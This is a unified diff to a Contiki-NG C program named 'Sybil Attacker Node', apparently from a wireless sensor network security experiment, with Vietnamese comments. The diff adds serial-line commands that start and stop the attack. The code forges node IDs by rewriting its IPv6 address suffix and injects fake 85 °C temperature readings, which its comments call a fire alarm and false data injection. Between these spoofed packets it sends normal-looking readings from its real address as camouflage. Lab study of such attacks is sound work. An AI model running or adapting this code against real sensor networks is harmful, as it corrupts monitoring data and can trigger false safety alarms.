@@ -8,6 +8,7 @@
 #include "sys/log.h"
 #include "lib/random.h"
 #include "net/ipv6/uip-ds6.h"
+#include "dev/serial-line.h"
 
 #define LOG_MODULE "SYBIL"
 #define LOG_LEVEL LOG_LEVEL_INFO
@@ -79,6 +80,8 @@ PROCESS(sybil_process, "Sybil Attacker Node");
 PROCESS(status_process, "Status reporter");
 AUTOSTART_PROCESSES(&sybil_process, &status_process);
 
+static bool is_attacking = false;
+
 PROCESS_THREAD(sybil_process, ev, data)
 {
   static struct etimer normal_timer;
@@ -93,14 +96,27 @@ PROCESS_THREAD(sybil_process, ev, data)
   
   LOG_INFO("Sybil Node started - Target: Sybil & False Data Injection\n");
   
-  /* B_t ` u 2 timer song song */
+  /* Bat dau cac timer */
   etimer_set(&normal_timer, NORMAL_SEND_INTERVAL);
-  etimer_set(&sybil_timer, SPAM_INTERVAL);
+  
 
   while(1) {
     PROCESS_WAIT_EVENT();
 
-    /* X- lA g-i gA3i tAn cA'ng Sybil & FDI */
+    if(ev == serial_line_event_message && data != NULL) {
+      char *str = (char *)data;
+      if(strncmp(str, "START_SYBIL", 11) == 0) {
+        LOG_INFO("Received START_SYBIL command via serial.\n");
+        is_attacking = true;
+        etimer_set(&sybil_timer, SPAM_INTERVAL);
+      } else if(strncmp(str, "STOP_SYBIL", 10) == 0) {
+        LOG_INFO("Received STOP_SYBIL command via serial.\n");
+        is_attacking = false;
+        etimer_stop(&sybil_timer);
+      }
+    }
+
+    
     if(ev == PROCESS_EVENT_TIMER && data == &sybil_timer) {
       if(NETSTACK_ROUTING.node_is_reachable() &&
          NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
@@ -115,17 +131,17 @@ PROCESS_THREAD(sybil_process, ev, data)
         p.residual_mj = residual_mj;
         p.tx_time = clock_time();
 
-        /* To ID gi mo */
+        /* Tao ID gia mao */
         uint16_t spoofed_id = 100 + (random_rand() % 11);
         
-        /* ? i IP ngu"n gi mo theo ID */
+        /* Doi IP nguon gia mao theo ID */
         uip_ds6_addr_t *addr_struct = uip_ds6_get_global(-1);
         if (addr_struct != NULL) {
             addr_struct->ipaddr.u16[7] = UIP_HTONS(spoofed_id);
         }
 
         p.node_id_f = spoofed_id;
-        p.temperature_c = 850; /* 85.0 `T C -> BAo chAy */
+        p.temperature_c = 850; /* 85.0 do C -> Bao chay (Fake Data Injection) */
 
         LOG_INFO("ATTACK_TX spoof_id=%u ip_suffix=%04x temp=%d seq=%lu\n",
                  spoofed_id, spoofed_id, p.temperature_c, (unsigned long)p.seqno);
@@ -135,12 +151,12 @@ PROCESS_THREAD(sybil_process, ev, data)
       etimer_set(&sybil_timer, SPAM_INTERVAL);
     }
 
-    /* X- lA g-i gA3i ngy trang (Normal) */
+    /* Xu ly gui data nguy trang (boc lo hoac an minh) */
     if(ev == PROCESS_EVENT_TIMER && data == &normal_timer) {
       if(NETSTACK_ROUTING.node_is_reachable() &&
          NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
         
-        /* KhA'i phc li IP chA-nh ch c a thng nAy tr>c khi g-i data th-t */
+        /* Khoi phuc lai IP goc truoc khi gui data that */
         uip_ds6_addr_t *addr_struct = uip_ds6_get_global(-1);
         if (addr_struct != NULL) {
             addr_struct->ipaddr.u16[7] = UIP_HTONS(node_id); 
@@ -156,7 +172,7 @@ PROCESS_THREAD(sybil_process, ev, data)
         p.seqno = sent_count++;
         p.residual_mj = residual_mj;
         p.tx_time = clock_time();
-        p.temperature_c = (int16_t)(250 + (random_rand() % 50)); /* 25.0 - 30.0 `T C */
+        p.temperature_c = (int16_t)(250 + (random_rand() % 50)); /* 25.0 - 30.0 do C (Nhiet do binh thuong) */
         
         LOG_INFO("NORMAL_TX node=%u temp=%d seq=%lu\n",
                  node_id, p.temperature_c, (unsigned long)p.seqno);
